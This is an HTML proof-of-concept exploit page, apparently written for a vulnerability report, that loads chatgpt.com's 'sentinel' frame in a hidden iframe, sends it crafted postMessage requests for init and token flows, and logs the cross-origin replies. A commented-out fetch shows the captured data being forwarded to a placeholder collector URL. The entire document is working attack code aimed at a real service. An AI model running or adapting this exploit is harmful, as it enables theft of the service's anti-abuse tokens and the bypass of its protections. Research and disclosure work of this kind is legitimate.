<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Sentinel postMessage exfil PoC</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, sans-serif; padding: 1rem; background:#0f172a; color:#e2e8f0; }
    h1 { font-size: 1.1rem; margin-bottom: .5rem; }
    #status { margin: .5rem 0 1rem; font-family: ui-monospace, SFMono-Regular, SFMono-Regular, SFMono-Regular, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
    pre { background: #020617; border: 1px solid #1f2937; padding: .75rem; max-height: 50vh; overflow: auto; font-size: .7rem; }
    button { background: #38bdf8; color: #0f172a; border: 0; padding: .4rem .8rem; border-radius: .375rem; cursor: pointer; margin-right: .5rem; }
    iframe { width:1px; height:1px; border:0; }
  </style>
</head>
<body>
  <h1>Sentinel postMessage exfil PoC</h1>
  <div id="status">loading…</div>
  <p>attacker origin (what the iframe will answer to): <strong id="origin"></strong></p>
  <p>
    <button id="send">send messages</button>
  </p>
  <pre id="log"></pre>

  <script>
    const ATTACKER_ORIGIN = window.location.origin;
    const SENTINEL_FRAME_URL = 'https://chatgpt.com/backend-api/sentinel/frame.html';
    const SENTINEL_ORIGIN = 'https://chatgpt.com';

    const logEl = document.getElementById('log');
    const statusEl = document.getElementById('status');
    const originEl = document.getElementById('origin');
    originEl.textContent = ATTACKER_ORIGIN;

    function log(...args) {
      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a, null, 2))).join(' ');
      logEl.textContent += line + '\n';
      logEl.scrollTop = logEl.scrollHeight;
      console.log(...args);
    }

    // 1) create iframe
    const iframe = document.createElement('iframe');
    iframe.src = SENTINEL_FRAME_URL;
    document.body.appendChild(iframe);

    statusEl.textContent = 'iframe loading ' + SENTINEL_FRAME_URL + ' …';

    // 2) listen for *any* message
    window.addEventListener('message', (event) => {
      // IMPORTANT: the vulnerable frame will send with event.origin === https://chatgpt.com
      log('<<< message from', event.origin, event.data);

      // optional: forward to your collector to show real exfil
      // fetch('https://YOUR_COLLECTOR_URL/collect', {
      //   method: 'POST',
      //   headers: { 'content-type': 'application/json' },
      //   body: JSON.stringify({ from: event.origin, data: event.data })
      // });
    });

    // 3) function that sends the actual malicious messages
    function sprayMessages() {
      const cw = iframe.contentWindow;
      if (!cw) {
        log('iframe not ready yet');
        return;
      }
      const msgs = [
        { type: 'init',  flow: 'req' },
        { type: 'init',  flow: 'chat' },
        { type: 'token', flow: 'req' },
        { type: 'token', flow: 'chat' },
        { type: 'token', flow: 'chat-requirements' },
      ];
      msgs.forEach((m, i) => {
        const msg = {
          ...m,
          p: {},
          requestId: 'atk-' + Date.now() + '-' + i
        };
        // we send to chatgpt.com explicitly so the browser accepts it
        cw.postMessage(msg, SENTINEL_ORIGIN);
        log('>>> sent to iframe:', msg);
      });
    }

    iframe.addEventListener('load', () => {
      statusEl.textContent = 'iframe loaded ' + SENTINEL_FRAME_URL;
      // small delay just to let their script finish attaching the listener
      setTimeout(sprayMessages, 500);
    });

    document.getElementById('send').addEventListener('click', sprayMessages);
  </script>
</body>
